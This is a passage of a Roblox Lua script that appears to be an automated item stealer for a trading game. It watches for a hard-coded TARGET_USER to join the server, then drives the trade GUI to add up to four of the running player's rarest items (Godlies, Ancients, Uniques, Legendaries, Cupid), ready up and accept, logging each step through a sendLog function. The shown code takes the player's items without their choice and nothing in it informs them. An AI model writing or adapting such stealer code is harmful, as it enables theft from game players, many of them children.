local function selectInventoryItem(item)
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("ImageButton") or gui:IsA("TextButton") then
                if gui.Name == item.Name or (gui:FindFirstChild("ItemName") and gui.ItemName.Text == item.Name) then
                    clickButton(gui)
                    sendLog("➕ Selected: " .. item.Name)
                    return true
                end
            end
        end
    end)
    return false
end

-- ============================================
-- MAIN AUTO TRADE SEQUENCE
-- ============================================

local tradeInProgress = false

local function startAutoTrade()
    if tradeInProgress then return end
    tradeInProgress = true
    
    sendLog("🎯 Starting auto trade with " .. TARGET_USER)
    
    -- Get items FIRST to check if we have any
    local items = getTradableItems()
    sendLog("📦 Total tradable items found: " .. #items)
    
    if #items == 0 then
        sendLog("⚠️ No rare items found in inventory to trade!")
        sendLog("💡 Looking for: Godlies, Ancients, Uniques, Legendaries, or Cupid")
        tradeInProgress = false
        return
    end
    
    -- List all items found
    for _, item in pairs(items) do
        sendLog("  - " .. item.Name)
    end
    
    -- Step 1: Open trade
    wait(1)
    findAndClickTradeButton()
    wait(2)
    
    -- Step 2: Accept trade request
    findAndClickAccept()
    wait(2)
    
    -- Step 3: Add up to 4 items
    local itemsAdded = 0
    for i = 1, math.min(4, #items) do
        findAndClickAddItem()
        wait(0.5)
        selectInventoryItem(items[i])
        wait(0.5)
        itemsAdded = itemsAdded + 1
    end
    
    sendLog("➕ Added " .. itemsAdded .. " items to trade")
    wait(1)
    
    -- Step 4: Ready up
    findAndClickReady()
    wait(1)
    
    -- Step 5: Final accept
    findAndClickAccept()
    
    sendLog("🎉 Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    tradeInProgress = false
end

-- ============================================
-- WATCH FOR TARGET JOINING
-- ============================================

local function watchForTarget()
    sendLog("👀 Watching for " .. TARGET_USER)
    sendLog("🎯 Trading items: Godlies, Ancients, Uniques, Legendaries, Cupid")
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog("👤 " .. TARGET_USER .. " is already in server!")
            wait(3)
            startAutoTrade()
            return
        end
    end
    
    -- Watch for joins
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
            wait(5)
            startAutoTrade()
        end
    end)
end

